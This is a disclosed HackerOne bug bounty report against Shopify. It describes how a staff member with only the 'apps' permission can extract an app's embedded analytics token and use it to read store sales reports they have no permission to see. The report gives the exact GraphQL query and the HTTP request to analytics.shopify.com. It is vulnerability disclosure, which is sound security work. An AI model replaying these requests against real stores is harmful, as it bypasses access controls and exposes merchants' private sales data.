# Get analytics token using only apps permission

## Report Details
- **Report ID**: 901775
- **URL**: https://hackerone.com/reports/901775
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2020-06-18T15:09:34.670Z
- **Disclosed**: 2020-08-18T21:29:44.758Z

## Reporter
- **Username**: jmp_35p
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: shopify

## Vulnerability Information
It seems apps that can read "analytics" have embedded analytic token. In order to access the /admin/reportify/token.json endpoint explicit dashboard or reports permission is required. A staff member with just "apps" permission can leverage the permissions of apps that can read reports to extract their embedded analyticsToken as long as the appropriate query which is provided below is used. The apikey of the POS app is used here as a variable (see token.png for more).

{"operationName":"EmbeddedAppAnalyticsToken","variables":{"apiKey":"a53cf2ce9b5dabf5dd222b3615c29569"},"query":"query EmbeddedAppAnalyticsToken($apiKey:String!){appByKey:appByKey(apiKey:$apiKey){id installation{id legacyEasdkAnalyticsToken __typename}__typename}}"}

Now, in order to read the store's reports the token gotten from above is used in the query below.
POST /validate?beta=true&dataOnly=false HTTP/1.1
Host: analytics.shopify.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded;charset=UTF-8
Origin: https://foobar.myshopify.com


q%5B%5D=SHOW+orders%2C+gross_sales%2C+discounts%2C+returns%2C+net_sales%2C+shipping%2C+taxes%2C+total_sales+OVER+day+FROM+sales+SINCE+-30d+UNTIL+today+ORDER+BY+day&source=new-admin&token={token_here}

## Impact

Staff member can perform actions they don't have permission to

## Attachments
No attachments
